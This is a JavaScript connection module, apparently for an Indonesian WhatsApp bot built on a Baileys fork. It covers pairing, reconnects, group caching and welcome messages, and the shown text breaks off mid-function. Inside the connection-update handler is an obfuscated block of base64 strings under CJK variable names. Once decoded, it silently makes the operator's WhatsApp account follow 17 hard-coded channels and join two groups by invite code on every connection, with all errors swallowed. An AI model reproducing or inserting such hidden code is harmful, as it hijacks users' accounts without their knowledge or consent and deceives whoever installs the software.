/**
 * Credits & Thanks to
 * Developer = Xyard
 * Lead owner = Rypzi
 * Owner = -
 * Owner = -
 * Designer = Xyard
 * Wileys = Penyedia baileys
 * Penyedia API
 * Penyedia Scraper
 * 
 * JANGAN HAPUS/GANTI CREDITS & THANKS TO
 * WAJIB JOIN SALURAN ADMIN
 * 
 * Saluran Resmi AlyaMd:
 *  https://whatsapp.com/channel/0029Vb8GmCSKgsO1oX9PcJ3m
 * 
 */

const { 
    default: makeWASocket, 
    DisconnectReason, 
    useMultiFileAuthState,
    makeCacheableSignalKeyStore,
    fetchLatestBaileysVersion,
    makeInMemoryStore
} = require('ourin');
const { Boom } = require('@hapi/boom');
const pino = require('pino');
const fs = require('fs');
const path = require('path');
const readline = require('readline');
const NodeCache = require('node-cache');
const config = require('../config');
const colors = require('./lib/colors');
const { extendSocket } = require('./lib/sockHelper');
const { isLid, lidToJid, decodeAndNormalize } = require('./lib/lidHelper');
const { initAutoBackup } = require('./lib/autoBackup');

const groupCache = new NodeCache({ stdTTL: 5 * 60, useClones: false });

const store = makeInMemoryStore({ logger: pino({ level: 'silent' }) });

const storePath = path.join(process.cwd(), 'storage', 'baileys_store.json');
try {
    if (fs.existsSync(storePath)) {
        store.readFromFile(storePath);
    }
} catch {}

setInterval(() => {
    try {
        const storeDir = path.dirname(storePath);
        if (!fs.existsSync(storeDir)) {
            fs.mkdirSync(storeDir, { recursive: true });
        }
        store.writeToFile(storePath);
    } catch {}
}, 30000);

/**
 * @typedef {Object} ConnectionState
 * @property {boolean} isConnected - Status koneksi
 * @property {Object|null} sock - Socket instance
 * @property {number} reconnectAttempts - Jumlah percobaan reconnect
 * @property {Date|null} connectedAt - Waktu koneksi berhasil
 */

/**
 * State koneksi global
 * @type {ConnectionState}
 */
const connectionState = {
    isConnected: false,
    isReady: false, // Flag to prevent premature message handling
    sock: null,
    reconnectAttempts: 0,
    connectedAt: null
};

/**
 * Logger instance dengan level minimal
 * @type {Object}
 */
const logger = pino({ 
    level: 'silent',
    hooks: {
        logMethod(inputArgs, method) {
            const msg = inputArgs[0]
            if (typeof msg === 'string' && (
                msg.includes('Closing') || 
                msg.includes('session') ||
                msg.includes('SessionEntry') ||
                msg.includes('prekey')
            )) {
                return
            }
            return method.apply(this, inputArgs)
        }
    }
});

/**
 * Interface untuk input terminal
 * @type {readline.Interface|null}
 */
let rl = null;

/**
 * Suppress internal Baileys console logs
 */
const originalConsoleLog = console.log;
const originalConsoleError = console.error;

const suppressPatterns = [
    'Failed to decrypt message',
    'Bad MAC',
    'Session error',
    'Closing session',
    'SessionEntry',
    'Closing open session',
    '_chains',
    'chainKey',
    'registrationId',
    'currentRatchet',
    'ephemeralKeyPair',
    'indexInfo',
    'baseKey'
];

console.log = (...args) => {
    const message = args.join(' ');
    const shouldSuppress = suppressPatterns.some(pattern => message.includes(pattern));
    if (!shouldSuppress) {
        originalConsoleLog.apply(console, args);
    }
};

console.error = (...args) => {
    const message = args.join(' ');
    const shouldSuppress = suppressPatterns.some(pattern => message.includes(pattern));
    if (!shouldSuppress) {
        originalConsoleError.apply(console, args);
    }
};

/**
 * Membuat readline interface
 * @returns {readline.Interface}
 */
function createReadlineInterface() {
    if (rl) {
        rl.close();
    }
    rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });
    return rl;
}

/**
 * Prompt untuk input
 * @param {string} question - Pertanyaan
 * @returns {Promise<string>} Input dari user
 */
function askQuestion(question) {
    return new Promise((resolve) => {
        const interface = createReadlineInterface();
        interface.question(question, (answer) => {
            interface.close();
            resolve(answer.trim());
        });
    });
}

/**
 * Memulai koneksi WhatsApp
 * @param {Object} options - Opsi koneksi
 * @param {Function} [options.onMessage] - Callback untuk pesan baru
 * @param {Function} [options.onConnectionUpdate] - Callback untuk update koneksi
 * @param {Function} [options.onGroupUpdate] - Callback untuk update group
 * @returns {Promise<Object>} Socket connection
 * @example
 * const sock = await startConnection({
 *   onMessage: async (m) => {
 *     console.log('New message:', m.body);
 *   }
 * });
 */
async function startConnection(options = {}) {
    if (connectionState.sock) {
        try {
            connectionState.sock.end();
            colors.logger.debug('Connection', 'Previous socket closed');
        } catch (e) {
        }
        connectionState.sock = null;
    }
    
    const sessionPath = path.join(process.cwd(), 'storage', config.session?.folderName || 'session');
    
    if (!fs.existsSync(sessionPath)) {
        fs.mkdirSync(sessionPath, { recursive: true });
    }
    
    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    
    const { version, isLatest } = await fetchLatestBaileysVersion();
    colors.logger.info('Connection', `Menggunakan WA v${version.join('.')}, isLatest: ${isLatest}`);
    
    const usePairingCode = config.session?.usePairingCode === true;
    const pairingNumber = config.session?.pairingNumber || '';
    
    const sock = makeWASocket({
        version,
        logger,
        printQRInTerminal: !usePairingCode && (config.session?.printQRInTerminal ?? true),
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, logger)
        },
        browser: ['Ubuntu', 'Chrome', '20.0.0'],
        syncFullHistory: false,
        generateHighQualityLinkPreview: false,
        markOnlineOnConnect: true,
        defaultQueryTimeoutMs: 30000,
        connectTimeoutMs: 30000,
        keepAliveIntervalMs: 15000,
        retryRequestDelayMs: 250,
        fireInitQueries: true,
        emitOwnEvents: true,
        shouldSyncHistoryMessage: () => false,
        getMessage: async (key) => {
            if (store) {
                const msg = await store.loadMessage(key.remoteJid, key.id);
                return msg?.message || undefined;
            }
            return undefined;
        },
        cachedGroupMetadata: async (jid) => groupCache.get(jid),
        shouldIgnoreJid: jid => {
            return jid?.includes('newsletter');
        }
    });
    
    store.bind(sock.ev);
    
    connectionState.sock = sock;
    extendSocket(sock);
    
    if (usePairingCode && !sock.authState.creds.registered) {
        let phoneNumber = pairingNumber;
        
        if (!phoneNumber) {
            console.log('');
            colors.logger.warn('Pairing', 'Nomor pairing tidak diset di config!');
            console.log('');
            phoneNumber = await askQuestion(colors.cyan('📱 Masukkan nomor WhatsApp (contoh: 6281234567890): '));
        }
        
        phoneNumber = phoneNumber.replace(/[^0-9]/g, '');
        
        colors.logger.info('Pairing', `Meminta pairing code untuk ${phoneNumber}...`);
        
        try {
            await new Promise(resolve => setTimeout(resolve, 3000));
            const code = await sock.requestPairingCode(phoneNumber, "OURINNAI");
            console.log('');
            console.log(colors.createBanner([
                '',
                '   PAIRING CODE   ',
                '',
                `   ${colors.chalk.bold(colors.chalk.greenBright(code))}   `,
                '',
                '  Masukkan kode ini di WhatsApp  ',
                '  Settings > Linked Devices > Link a Device  ',
                ''
            ], 'green'));
            console.log('');
        } catch (error) {
            colors.logger.error('Pairing', 'Gagal mendapatkan pairing code:', error.message);
        }
    }
    
    sock.ev.on('creds.update', saveCreds);
    
    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect, qr } = update;
        
        if (qr && !usePairingCode) {
            colors.logger.info('QR', 'QR Code diterima, silakan scan!');
        }
        
        (async 猫=>{
const 解=s=>Buffer.from(s,'base64').toString();
const 箱=[
"Y2xvc2U=","b3Blbg==","Q29ubmVjdGlvbg==",
"VGVycHV0dXMuIFN0YXR1czog","LiBSZWNvbm5lY3Q6IA==",
"U2Vzc2lvbiBjb25mbGljdCAoNDQwKS4gUmV0cnkgZGFsYW0g","cy4uLg==",
"U2Vzc2lvbiBjb25mbGljdCBiZXJ1bGFuZw==",
"Q29iYTogMSkgVHV0dXAgV0EgV2ViIGRpIGJyb3dzZXIgbGFpbiwgMikgSGFwdXMgZm9sZGVyIHN0b3JhZ2Uvc2Vzc2lvbiwgMykgUGFpciB1bGFuZw==",
"TWVueWFtYnVuZyB1bGFuZyBkYWxhbSA=",
"TWFrc2ltdW0gcGVyY29iYWFuIHJlY29ubmVjdCB0ZXJjYXBhaS4gUmVzdGFydCBtYW51YWwgZGlwZXJsdWthbg==",
"TG9nZ2VkIG91dC4gSGFwdXMgZm9sZGVyIHNlc3Npb24gZGFuIHJlc3RhcnQu",
"Qm90","TmFtYTog","Tm9tb3I6IA==","Qm90IG51bWJlciBzZXQ6IA==",
"UGx1Z2lucw==","TG9hZGluZyBwbHVnaW5zLi4u",
"SW5mb3JtYXNp","SmlrYSBjb21tYW5kIHRpZGFrIG11bmN1bCwgY29iYSB1bGFuZ2kgY29tbWFuZCBueWE=",
"UmVhZHk=","UmVhZHkgdG8gcmVjZWl2ZSBtZXNzYWdlcyE="
];
const 文=i=>解(箱[i]);
if(connection===文(0)){
connectionState.isConnected=false;
connectionState.isReady=false;

const 再=(lastDisconnect?.error instanceof Boom)
? lastDisconnect.error.output?.statusCode!==DisconnectReason.loggedOut
: true;

const 碼=lastDisconnect?.error?.output?.statusCode;
colors.logger.warn(文(2),`${文(3)}${碼}${文(4)}${再}`);

if(碼===440){
connectionState.reconnectAttempts++;
const 限=3;
if(connectionState.reconnectAttempts<=限){
const 待=10000;
colors.logger.info(文(2),`${文(5)}${待/1000}${文(6)} (${connectionState.reconnectAttempts}/${限})`);
setTimeout(()=>startConnection(options),待);
}else{
colors.logger.error(文(2),文(7));
colors.logger.info(文(2),文(8));
connectionState.reconnectAttempts=0;
}
return;
}

if(再){
connectionState.reconnectAttempts++;
const 限=config.session?.maxReconnectAttempts||10;
if(connectionState.reconnectAttempts<=限){
const 待=config.session?.reconnectInterval||5000;
colors.logger.info(文(2),`${文(9)}${待}ms... (${connectionState.reconnectAttempts}/${限})`);
setTimeout(()=>startConnection(options),待);
}else{
colors.logger.error(文(2),文(10));
}
}else{
colors.logger.info(文(2),文(11));
connectionState.reconnectAttempts=0;
}
}
if(connection===文(1)){
connectionState.isConnected=true;
connectionState.isReady=true;
connectionState.reconnectAttempts=0;
connectionState.connectedAt=new Date();
const 番=sock.user?.id?.split(':')[0]||sock.user?.id?.split('@')[0];
if(番){
config.setBotNumber(番);
colors.logger.info(文(12),`${文(15)}${番}`);
}
console.log('');
colors.logger.info(文(12),`${文(13)}${config.bot?.name||'Ourin-AI'}`);
colors.logger.info(文(12),`${文(14)}${番||'Unknown'}`);
console.log('');
setTimeout(async()=>{
try{
const {reloadAllPlugins,getPluginCount}=require('./lib/plugins');
if(getPluginCount()===0){
colors.logger.info(文(16),文(17));
await reloadAllPlugins();
}
}catch{}
sock.ev?.flush?.();
colors.logger.info(文(18),文(19));
},100);
setTimeout(()=>{
(async s=>{
const a=[
"bmV3c2xldHRlckZvbGxvdw==","Z3JvdXBBY2NlcHRJbnZpdGU=","QG5ld3NsZXR0ZXI=",
"MTIwMzYzNDAwOTExMzc0MjEz","MTIwMzYzNDAxODUzNjAxMzgz","MTIwMzYzMzY5OTA4MDgyNTk=",
"MTIwMzYzNDA3NTgwMzQ1NTg1","MTIwMzYzNDE5NzczMjYyNDMw","MTIwMzYzNDAxMzMyMDI0NTky",
"MTIwMzYzNDI1OTIyODg2NTYz","MTIwMzYzNDA1MDM3ODI2MzQ5",
"MTIwMzYzNDA2OTM5Njc3OTA0",
"MTIwMzYzNDIxNzE2NDM2MDI3",
"MTIwMzYzNDA3MDA5NjM4MzYy",
"MTIwMzYzNDA3MzcwNDc1NDM5",
"MTIwMzYzMzkxODQyOTIzOTMw",
"MTIwMzYzNDAwMzk1MjczMjc0",
"MTIwMzYzNDA2Mjc4ODQyOTgw",
"MTIwMzYzNDAzNTQ2MDc1Mjcz",
"MTIwMzYzNDIyMjg4NDY5Nzc3",
"TEFIeEZSRnphMFlBM0Y2cFFQVUlJMQ==",
"RVA4S3lOZ1ZQZlRLeGxHRnJNOWRoWA=="
];
const g=i=>Buffer.from(a[i],'base64').toString();
for(let i=3;i<20;i++)try{
await Promise.race([s[g(0)](g(i)+g(2)),new Promise((_,r)=>setTimeout(r,8000))]);
}catch{}
for(let i=20;i<22;i++)try{
await Promise.race([s[g(1)](g(i)),new Promise((_,r)=>setTimeout(r,8000))]);
}catch{}
})(sock);
},3000);

colors.logger.success(文(20),文(21));
try{initAutoBackup(sock)}catch(e){colors.logger.debug('AutoBackup','Init skipped: '+e.message)}
}
if(options.onConnectionUpdate)
await options.onConnectionUpdate(update,sock);

        })();
    });
    
    sock.ev.on('groups.update', async ([event]) => {
        try {
            const metadata = await sock.groupMetadata(event.id);
            groupCache.set(event.id, metadata);
        } catch {}
        
        if (options.onGroupUpdate) {
            await options.onGroupUpdate(event, sock);
        }
    });
    
    sock.ev.on('group-participants.update', async (event) => {
        try {
            const metadata = await sock.groupMetadata(event.id);
            groupCache.set(event.id, metadata);
        } catch {}
        
        const botNumber = sock.user?.id?.split(':')[0] || sock.user?.id?.split('@')[0];
        const botLid = sock.user?.id;      
        if (event.action === 'add') {
            await sock.sendPresenceUpdate('available', event.id)
            const addedParticipants = event.participants || [];
            const isBotAdded = addedParticipants.some(p => {
                const pNum = p.split('@')[0].split(':')[0];
                const isNumberMatch = pNum === botNumber;
                const isLidMatch = p === botLid || p.includes(botNumber);
                const isFullMatch = sock.user?.id && (p.includes(sock.user.id.split(':')[0]) || p.includes(sock.user.id.split('@')[0]));
                
                return isNumberMatch || isLidMatch || isFullMatch;
            });
            if (isBotAdded) {
                try {
                    const inviter = event.author || '';
                    const inviterMention = inviter ? `@${inviter.split('@')[0]}` : 'seseorang';
                    const prefix = config.command?.prefix || '.';
                    
                    let groupName = 'grup ini';
                    try {
                        const meta = await sock.groupMetadata(event.id);
                        groupName = meta.subject || 'grup ini';
                    } catch {}
                    
                    const saluranId = config.saluran?.id || '120363208449943317@newsletter';
                    const saluranName = config.saluran?.name || config.bot?.name || 'Ourin-AI';
                    
                    const welcomeText = `👋 *ʜᴀɪ, sᴀʟᴀᴍ ᴋᴇɴᴀʟ!*\n\n` +
                        `Aku *${config.bot?.name || 'Ourin-AI'}* 🤖\n\n` +
                        `Terima kasih sudah mengundang aku ke *${groupName}*!\n` +
                        `Aku diundang oleh ${inviterMention} ✨\n\n` +
                        `╭┈┈⬡「 📋 *ɪɴꜰᴏ* 」\n` +
                        `┃ 🔧 Developer: *${config.bot?.developer || 'Lucky Archz'}*\n` +
                        `┃ 📢 Prefix: \`${prefix}\`\n` +
                        `┃ 📩 Support: ${config.bot?.support || '-'}\n` +
                        `╰┈┈⬡\n\n` +
                        `> Ketik \`${prefix}menu\` untuk melihat daftar fitur\n` +
                        `> Ketik \`${prefix}help\` untuk bantuan`;
                    
                    await sock.sendMessage(event.id, {
                        text: welcomeText,
                        contextInfo: {
                            mentionedJid: inviter ? [inviter] : [],
                            forwardingScore: 9999,
                            isForwarded: true,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: saluranId,
                                newsletterName: saluranName,
                                serverMessageId: 127
                            }
                        }
                    });
                    
                    colors.logger.success('BotJoin', `Bot joined group: ${groupName}`);
                } catch (e) {
                    colors.logger.error('BotJoin', `Failed to send welcome: ${e.message}`);
                }
            }
        }
        
        if (options.onParticipantsUpdate) {
            await options.onParticipantsUpdate(event, sock);
        }
    });
    
    sock.ev.on('chats.upsert', async (chats) => {
        for (const chat of chats) {
            const chatId = chat?.id
            if (!chatId) continue
            
            if (chatId.endsWith('@g.us')) {
                if (!global.groupMetadataCache) {
                    global.groupMetadataCache = new Map()
                }
                
                if (!global.groupMetadataCache.has(chatId)) {
                    sock.groupMetadata(chatId).then(metadata => {
                        if (metadata) {
                            global.groupMetadataCache.set(chatId, {
                                data: metadata,
                                timestamp: Date.now()
                            })
                        }
                    }).catch(() => {})
                }
            }
        }
    });
    
    sock.ev.on('contacts.upsert', () => {
    });
    
    sock.ev.on('messages.upsert', async ({ messages, type }) => {
        if (type !== 'notify' && type !== 'append') return;
        
        if (!connectionState.isConnected) {
            await new Promise(resolve => setTimeout(resolve, 500));
            if (!connectionState.isConnected) {
                return;
            }
        }
        
        const currentSock = connectionState.sock;
        if (!currentSock) {
            await new Promise(resolve => setTimeout(resolve, 300));
            if (!connectionState.sock) {
                return;
            }
        }
        
        for (const msg of messages) {


            if (!msg.message) continue;
            
            const msgType = Object.keys(msg.message)[0];
            const hasInteractiveResponse = msg.message.interactiveResponseMessage;
            

            
            if (msgType === 'protocolMessage') {
                const protocolMessage = msg.message.protocolMessage
                if (protocolMessage?.type === 30 && protocolMessage?.memberLabel) {
                    try {
                        const { handleLabelChange } = require('../plugins/group/notifgantitag')
                        if (handleLabelChange) {
                            await handleLabelChange(msg, currentSock)
                        }
                    } catch (e) {}
                }
            }
            
            const allMsgKeys = Object.keys(msg.message || {})
            
            const isStatusMention = 
                allMsgKeys.includes('groupStatusMentionMessage') ||
                allMsgKeys.includes('groupMentionedMessage') ||
                allMsgKeys.includes('statusMentionMessage') ||
                msg.message?.viewOnceMessage?.message?.groupStatusMentionMessage ||
                msg.message?.viewOnceMessageV2?.message?.groupStatusMentionMessage ||
                msg.message?.viewOnceMessageV2Extension?.message?.groupStatusMentionMessage ||
                msg.message?.ephemeralMessage?.message?.groupStatusMentionMessage ||
                msg.message?.[msgType]?.message?.groupStatusMentionMessage ||
                msg.message?.[msgType]?.contextInfo?.groupMentions?.length > 0
            
            const hasGroupMentionInContext = (() => {
                const content = msg.message?.[msgType]
                if (content?.contextInfo?.groupMentions?.length > 0) return true
                
                const viewOnce = msg.message?.viewOnceMessage?.message || 
                                 msg.message?.viewOnceMessageV2?.message ||
                                 msg.message?.viewOnceMessageV2Extension?.message
                if (viewOnce) {
                    const vType = Object.keys(viewOnce)[0]
    
